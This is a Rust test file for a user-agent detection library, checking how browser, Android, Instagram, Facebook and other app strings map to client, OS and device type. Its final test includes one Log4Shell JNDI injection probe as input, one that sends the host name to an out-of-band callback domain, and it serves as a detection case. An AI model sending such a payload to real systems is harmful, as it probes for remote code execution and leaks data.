//! User agents the corpus does not speak for.
//!
//! The corpus shows these shapes once, or not at all, so it cannot catch a regression on them.
//! Written by hand, unlike everything else under `tests/`.

use device_detector::Detection;

fn detect(user_agent: &str) -> Option<Detection> {
    device_detector::shared().detect_with_headers(user_agent, &[])
}

/// Calling a reader a crawler is the one error that costs something, so it gets its own test.
/// These are people, and must not resolve to a bot whatever else the database makes of them.
#[test]
fn human_traffic_is_never_a_bot() {
    let cases = [
        "mozilla/5.0 (macintosh; intel mac os x 10_12_5; rv:60.1.0) gecko/20100101 firefox/60.1.0",
        "mozilla/5.0 (macintosh; intel mac os x 10_7_0 rv:6.0; da-dk) applewebkit/535.5.1 (khtml, like gecko) version/5.1 safari/535.5.1",
        "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/141.0.7390.123 safari/537.36",
        "mozilla/5.0 (android 2.2; mobile; rv:20.0) gecko/20.0 firefox/20.0",
        "mozilla/5.0 (ipod; u; cpu iphone os 3_3 like mac os x; bho-in) applewebkit/532.5.5 (khtml, like gecko) version/4.0.5 mobile/8b115 safari/6532.5.5",
        "mozilla/5.0 (iphone; cpu iphone os 26_6_1 like mac os x) applewebkit/605.1.15 (khtml, like gecko) mobile/23g83 instagram 446.0.0.28.66 (iphone12,1; ios 26_6_1; en_gb; en-gb; scale=2.00; 828x1792; iabmv/1; 1060018354) safari/604.1",
        "mozilla/5.0 (ipad; cpu os 26_5_2 like mac os x) applewebkit/605.1.15 (khtml, like gecko) version/26.5.2 mobile/15e148 safari/604.1 musical_ly_46.6.0 jssdk/2.0 nettype/wifi channel/app store bytelocale/pt region/es isdarkmode/0 revealtype/dialog",
    ];

    for user_agent in cases {
        let bot = detect(user_agent).and_then(|detection| detection.bot);

        assert_eq!(bot.map(|bot| bot.name), None, "read as a bot: {user_agent}");
    }
}

/// The plainest string Chrome sends, on the desktops it sends it from: the build number moves
/// and nothing else does.
#[test]
fn plain_chrome_names_the_desktop_under_it() {
    let cases = [
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.8222.1876 Safari/537.36", "Windows", "10", "x64", ""),
        ("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36", "Windows", "10", "x64", ""),
        ("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36", "Windows", "7", "", ""),
        ("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36", "Windows", "XP", "", ""),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.8222.1876 Safari/537.36", "Mac", "10.14.0", "", "Apple"),
        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36", "GNU/Linux", "", "x64", ""),
        ("Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36", "GNU/Linux", "", "x86", ""),
        // Chrome has sent AppleWebKit/537.36 frozen since Blink; not everything has read the memo.
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/602.1.50 (KHTML, like Gecko) Chrome/114.0.5774.76 Safari/602.1.50", "Windows", "10", "x64", ""),
    ];

    for (user_agent, os_name, os_version, platform, brand) in cases {
        let detection = detect(user_agent).unwrap_or_else(|| panic!("no entry matches {user_agent}"));
        let os = detection.os.unwrap_or_default();
        let device = detection.device.unwrap_or_default();

        assert_eq!(
            (
                detection.client.unwrap_or_default().name.as_str(),
                device.kind.as_str(),
                os.name.as_str(),
                os.version.as_str(),
                os.platform.as_str(),
                device.brand.as_str(),
            ),
            ("Chrome", "desktop", os_name, os_version, platform, brand),
            "{user_agent}"
        );
    }
}

/// An Android build number says which nightly the ROM came off and nothing about the device, so
/// the model has to survive it changing.
#[test]
fn the_build_number_does_not_name_the_device() {
    let cases = [
        ("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.6688.1115 Mobile Safari/537.36", "Google", "Nexus 5", "6.0"),
        ("Mozilla/5.0 (Linux; Android 5.1.1; SM-G920P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36", "Samsung", "Galaxy S6", "5.1.1"),
    ];

    for (user_agent, brand, model, os_version) in cases {
        let detection = detect(user_agent).unwrap_or_else(|| panic!("no entry matches {user_agent}"));
        let device = detection.device.unwrap_or_default();

        assert_eq!(
            (
                detection.client.unwrap_or_default().name.as_str(),
                device.kind.as_str(),
                device.brand.as_str(),
                device.model.as_str(),
                detection.os.unwrap_or_default().version.as_str(),
            ),
            ("Chrome Mobile", "smartphone", brand, model, os_version),
            "{user_agent}"
        );
    }
}

/// Android, when the model token names nothing the corpus knows. The client is still readable:
/// `wv` marks a WebView, so does Version/4.0, and the plain string is Chrome Mobile. The brand
/// and the model stay empty rather than guessed.
#[test]
fn android_is_readable_without_knowing_the_model() {
    let cases = [
        (
            "Mozilla/5.0 (Linux; Android 14; V2189) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.5467.69 Mobile Safari/537.36",
            "Chrome Mobile",
            "14",
        ),
        (
            "Mozilla/5.0 (Linux; Android 16; RMX3844 Build/BP2A.250605.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/154.0.8037.0 Mobile Safari/537.36",
            "Chrome Webview",
            "16",
        ),
    ];

    for (user_agent, client, os_version) in cases {
        let detection = detect(user_agent).unwrap_or_else(|| panic!("no entry matches {user_agent}"));
        let device = detection.device.unwrap_or_default();

        assert_eq!(
            (
                detection.client.unwrap_or_default().name.as_str(),
                device.kind.as_str(),
                device.brand.as_str(),
                device.model.as_str(),
                detection.os.unwrap_or_default().version.as_str(),
            ),
            (client, "smartphone", "", "", os_version),
            "{user_agent}"
        );
    }
}

/// Instagram, on a device the corpus never recorded. The app names itself and its own version
/// without help from the model token or the Chrome build the WebView happens to be on.
#[test]
fn instagram_names_itself_without_the_device() {
    let cases = [
        (
            "Mozilla/5.0 (Linux; Android 16; SM-S731B Build/BP4A.251205.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/153.0.8010.26 Mobile Safari/537.36 Instagram 446.0.0.49.77 Android (36/16; 450dpi; 1080x2340; samsung; SM-S731B; r13s; s5e9945; nl_BE; 1061744178; IABMV/1)",
            "446.0.0.49.77", "Android", "16", "smartphone", "",
        ),
        (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H422 Instagram 410.1.0.36.70 (iPhone9,3; iOS 15_8_8; de_DE; de; scale=2.00; 750x1334; IABMV/1; 849447290) NW/3 Safari/604.1",
            "410.1.0.36.70", "iOS", "15.8.8", "smartphone", "Apple",
        ),
        (
            "Mozilla/5.0 (iPad; CPU OS 17_7_11 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21H461 Instagram 446.0.0.28.66 (iPad7,3; iPadOS 17_7_11; es_ES; es-ES; scale=2.00; 1668x2224; IABMV/1; 1060018354) Safari/604.1",
            "446.0.0.28.66", "iPadOS", "17.7.11", "tablet", "Apple",
        ),
    ];

    for (user_agent, version, os_name, os_version, kind, brand) in cases {
        let detection = detect(user_agent).unwrap_or_else(|| panic!("no entry matches {user_agent}"));
        let client = detection.client.unwrap_or_default();
        let device = detection.device.unwrap_or_default();
        let os = detection.os.unwrap_or_default();

        assert_eq!(
            (
                client.name.as_str(), client.kind.as_str(), client.version.as_str(),
                os.name.as_str(), os.version.as_str(),
                device.kind.as_str(), device.brand.as_str(),
            ),
            ("Instagram", "mobile app", version, os_name, os_version, kind, brand),
            "{user_agent}"
        );
    }
}

/// A user agent that says iPhone is not a desktop unless the client hints say so. A desktop
/// sending an iPhone string is a shape only the hints give away, so with none on the request
/// whatever answers must not say desktop.
#[test]
fn an_iphone_is_not_a_desktop_without_hints_saying_so() {
    let cases = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 26_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23G71 [FBAN/FBIOS;FBAV/577.0.0.22.107;FBBV/1055880302;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/26.6;FBSS/3;FBCR/;FBID/phone;FBLC/el_GR;FBOP/80]",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/124.0.6367.127 Mobile/15E148 Safari/537.36",
    ];

    for user_agent in cases {
        let Some(detection) = detect(user_agent) else {
            continue;
        };
        let os = detection.os.clone().unwrap_or_default();

        assert_ne!(detection.device.unwrap_or_default().kind, "desktop", "{user_agent}");
        assert!(
            !matches!(os.name.as_str(), "GNU/Linux" | "Windows"),
            "reported {} for {user_agent}",
            os.name
        );
    }
}

/// Facebook, in the four shapes it sends. The native Android app is the odd one: no Mozilla
/// prefix at all, and its Android version at FBSV.
#[test]
fn facebook_names_itself_in_every_shape_it_sends() {
    let cases = [
        (
            "[FBAN/FB4A;FBAV/576.0.0.42.73;FBBV/1050971809;FBDM/{density=2.8125,width=1080,height=2340};FBLC/fr_FR;FBRV/1060800168;FBCR/Free;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A176B;FBSV/16;FBOP/1;FBCA/arm64-v8a:;]",
            "576.0.0.42.73", "Android", "16", "smartphone", "",
        ),
        (
            "Mozilla/5.0 (Linux; Android 10; CPH2005 Build/QKQ1.200216.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.134 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/574.0.0.40.71;IABMV/1;]",
            // The brand is not in this entry: it comes from the model token, through models.yml.
            "574.0.0.40.71", "Android", "10", "smartphone", "OPPO",
        ),
        (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 26_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23G71 Safari/604.1 [FBAN/FBIOS;FBAV/576.0.0.47.71;FBBV/1048889375;FBDV/iPhone17,1;FBMD/iPhone;FBSN/iOS;FBSV/26.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/1054053261;IABMV/1]",
            "576.0.0.47.71", "iOS", "26.6", "smartphone", "Apple",
        ),
        (
            "Mozilla/5.0 (iPad; CPU OS 26_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23H24 Safari/604.1 [FBAN/FBIOS;FBAV/578.1.0.71.72;FBBV/1063022819;FBDV/iPad15,5;FBMD/iPad;FBSN/iPadOS;FBSV/26.7;FBSS/2;FBID/tablet;FBLC/de_DE;FBOP/5;FBRV/0;IABMV/1]",
            "578.1.0.71.72", "iPadOS", "26.7", "tablet", "Apple",
        ),
    ];

    for (user_agent, version, os_name, os_version, kind, brand) in cases {
        let detection = detect(user_agent).unwrap_or_else(|| panic!("no entry matches {user_agent}"));
        let client = detection.client.unwrap_or_default();
        let device = detection.device.unwrap_or_default();
        let os = detection.os.unwrap_or_default();

        assert_eq!(
            (
                client.name.as_str(), client.kind.as_str(), client.version.as_str(),
                os.name.as_str(), os.version.as_str(),
                device.kind.as_str(), device.brand.as_str(),
            ),
            ("Facebook", "mobile app", version, os_name, os_version, kind, brand),
            "{user_agent}"
        );
    }
}

/// Two entries that were never written with each other in mind, answering together: one reads
/// the app out of the FB tokens, the other a model token wherever it appears.
#[test]
fn entries_compose_across_axes() {
    let cases = [
        // The native Android app, which names the model at FBDV and nowhere else.
        (
            "[FBAN/FB4A;FBAV/576.0.0.42.73;FBBV/1050971735;FBLC/fr_FR;FBMF/Xiaomi;FBPN/com.facebook.katana;FBDV/2109119DG;FBSV/14;FBOP/1;]",
            "Facebook", "Xiaomi", "Mi 11 Lite 5G",
        ),
        // The WebView, which names it in the platform token.
        (
            "Mozilla/5.0 (Linux; Android 10; CPH2005 Build/QKQ1.200216.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.134 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/574.0.0.40.71;IABMV/1;]",
            "Facebook", "OPPO", "Find X2 Lite",
        ),
    ];

    for (user_agent, client, brand, model) in cases {
        let detection = detect(user_agent).unwrap_or_else(|| panic!("no entry matches {user_agent}"));
        let device = detection.device.unwrap_or_default();

        assert_eq!(
            (
                detection.client.unwrap_or_default().name.as_str(),
                device.kind.as_str(),
                device.brand.as_str(),
                device.model.as_str(),
            ),
            (client, "smartphone", brand, model),
            "{user_agent}"
        );
    }
}

/// Lowercasing a user agent must not change what it means: roughly one request in ten arrives
/// folded somewhere along the way.
#[test]
fn case_does_not_change_what_a_user_agent_means() {
    let cases = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.123 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.8222.1876 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H422 Instagram 410.1.0.36.70 (iPhone9,3; iOS 15_8_8; de_DE; de; scale=2.00; 750x1334; IABMV/1; 849447290) NW/3 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; CPH2005 Build/QKQ1.200216.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.134 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/574.0.0.40.71;IABMV/1;]",
        "Mozilla/5.0 (Linux; Android 14; V2189) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.5467.69 Mobile Safari/537.36",
    ];

    for user_agent in cases {
        let sent = detect(user_agent).unwrap_or_else(|| panic!("no entry matches {user_agent}"));
        let folded = detect(&user_agent.to_lowercase())
            .unwrap_or_else(|| panic!("no entry matches the lowercased {user_agent}"));

        assert_eq!(
            (
                sent.client.unwrap_or_default().name,
                sent.device.unwrap_or_default().kind,
            ),
            (
                folded.client.unwrap_or_default().name,
                folded.device.unwrap_or_default().kind,
            ),
            "{user_agent}"
        );
    }
}

/// An app the database has never seen, on a device it has never seen, wrapped around a browser.
/// None of these is recognised in full by any one entry, and none needs to be: the platform
/// token says which system, the client token says which app, and separate entries read them.
#[test]
fn the_axes_answer_what_no_single_entry_knows() {
    let cases = [
        (
            "Mozilla/5.0 (Linux; Android 12; M2102J29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.5596.0 Mobile Safari/537.36 MicroMessenger/8.0.43(0x18001B3F) NetType/WIFI Language/zh_CN",
            "WeChat", "Android", "12",
        ),
        (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 26_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3.1 Mobile/15E148 Safari/604.1 musical_ly_46.4.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/DE isDarkMode/0 RevealType/Dialog",
            "TikTok", "iOS", "26.3.1",
        ),
        (
            "Mozilla/5.0 (Linux; Android 16; 23127PN0CC Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.115 Mobile Safari/537.36 Xiaoyuzhou/2.115.0 Android/16",
            "Chrome Webview", "Android", "16",
        ),
    ];

    for (user_agent, client, os_name, os_version) in cases {
        let detection = detect(user_agent).unwrap_or_else(|| panic!("no entry matches {user_agent}"));
        let os = detection.os.unwrap_or_default();

        assert_eq!(
            (
                detection.client.unwrap_or_default().name.as_str(),
                os.name.as_str(),
                os.version.as_str(),
            ),
            (client, os_name, os_version),
            "{user_agent}"
        );
    }
}

/// What a user agent names last is not what it is. Each of these carries two client tokens or
/// more, and which one answers is settled by the order the entries are read in: an app hosting a
/// WebView is the app, a browser that says which build it is beats the one that only says Chrome.
#[test]
fn the_more_particular_client_wins() {
    let cases = [
        // An app, over the WebView it is drawn in.
        ("Mozilla/5.0 (Linux; U; Android 14; ru-ru; Redmi 12C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/14.1.1.1-gn [LinkedInApp]/0.948.518", "LinkedIn"),
        ("Mozilla/5.0 (Linux; Android 15; ONEPLUS A6003 Build/BP1A.250505.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/152.0.7977.64 Mobile Safari/537.36 [Pinterest/Android]", "Pinterest"),
        ("Mozilla/5.0 (Linux; Android 16; SM-S931B Build/BP4A.251205.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.200 Mobile Safari/537.36 Reddit/Version 2026.35.0/Build 2635090/Android 16", "Reddit"),
        ("Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; OPPO R9 Plusm A Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.9.4.974 UWS/2.14.0.3 Mobile Safari/537.36 AliApp(TB/7.8.3) UCBS/2.11.1.1 TTID/10001401@taobao_android_7.8.3 WindVane/8.3.0 1080X1920", "Taobao"),
        ("Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTAS35.51-137-2; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.137 Mobile Safari/537.36 BingSapphire/33.9.440810006", "Microsoft Bing"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.13) Gecko/20100101 Firefox/105.13; compatible; WhatsApp/10.0.2.1", "WhatsApp"),
        // A browser that says which build it is, over the one that only says Chrome.
        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/107.0.5296.0 Safari/537.36", "Headless Chrome"),
        ("Mozilla/5.0 (Linux; Android 16; SM-S918B Build/BP4A.251205.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.7922.202 Mobile Safari/537.36 OPX/3.3", "Opera GX"),
        ("Mozilla/5.0 (Linux; U; Android 12; zh-Hans-CN; FOA-AL00 Build/HUAWEIFOA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.86 Quark/10.17.0.1145 Mobile Safari/537.36", "Quark"),
        ("Mozilla/5.0 (Linux; Android 14; 2409BRN2CY Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/152.0.7977.64 Mobile Safari/537.36 buscari/159", "Seekee"),
        // A Chromium rebrand, over the Chrome it is built on.
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Avast/126.0.0.0-817", "Avast Secure Browser"),
    ];

    let wrong: Vec<String> = cases
        .iter()
        .filter_map(|(user_agent, want)| {
            let got = detect(user_agent)
                .and_then(|detection| detection.client)
                .map_or_else(|| String::from("<none>"), |client| client.name);

            (got != *want).then(|| format!("\n  {want} read as {got}\n    {user_agent}"))
        })
        .collect();

    assert!(wrong.is_empty(), "{}", wrong.join(""));
}

/// The type follows from the device, and the device from whatever says what it is.
///
/// These are the strings where the platform token settles none of it: an Android whose model
/// names a television rather than a phone, and an app that writes which system it is on inside
/// its own bracket and nowhere else. Both read as the wrong type without an entry that looks
/// where the answer actually is.
#[test]
fn the_type_follows_from_whatever_names_the_device() {
    let cases = [
        (
            "Mozilla/5.0 (Linux; Android 12; Philips Google TV TA1 Build/STT2.230831.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.200 Mobile Safari/537.36",
            "tv",
        ),
        (
            "LightSpeed [FBAN/MessengerLiteForiOS;FBAV/576.0.0.31.108;FBBV/1049580600;FBDV/iPhone17,4;FBMD/iPhone;FBSN/iOS;FBSV/26.6.1;FBSS/3;FBCR/;FBID/phone;FBLC/fr_FR;FBOP/0]",
            "smartphone",
        ),
    ];

    let wrong: Vec<String> = cases
        .iter()
        .filter_map(|(user_agent, want)| {
            let got = detect(user_agent)
                .map(|detection| detection.device.unwrap_or_default().kind)
                .unwrap_or_else(|| String::from("<no entry matches>"));

            (got != *want).then(|| format!("\n  {want} read as {got:?}\n    {user_agent}"))
        })
        .collect();

    assert!(wrong.is_empty(), "{}", wrong.join(""));
}

/// Strings that end where an entry expected them to go on.
///
/// `iOS/18.5` closes the user agent rather than being followed by a semicolon, `WordPress.com`
/// names itself without a version after a slash, and a crawler writes nothing but the injection
/// it is probing with. Each reached no entry at all.
#[test]
fn a_token_at_the_end_of_the_string_still_counts() {
    let cases = [
        ("Google Gmail/6.0.250420.1796766 model/iPhone16,1 iOS/18.5", "iOS", ""),
        ("WordPress.com; https://notebloc.wordpress.com", "", "WordPress"),
        ("${jndi:ldap://127.0.0.1#.${hostName}.useragent.dafl9tmqvk5fjoiqdoc0798xg8nb1dp5d.oast.me}", "", "Interactsh"),
    ];

    let wrong: Vec<String> = cases
        .iter()
        .filter_map(|(user_agent, os, bot)| {
            let Some(detection) = detect(user_agent) else {
                return Some(format!("\n  no entry matches\n    {user_agent}"));
            };
            let found_os = detection.os.clone().unwrap_or_default().name;
            let found_bot = detection.bot.clone().map(|b| b.name).unwrap_or_default();

            (!os.is_empty() && found_os != *os || !bot.is_empty() && found_bot != *bot)
                .then(|| format!("\n  wanted os {os:?} bot {bot:?}, got os {found_os:?} bot {found_bot:?}\n    {user_agent}"))
        })
        .collect();

    assert!(wrong.is_empty(), "{}", wrong.join(""));
}

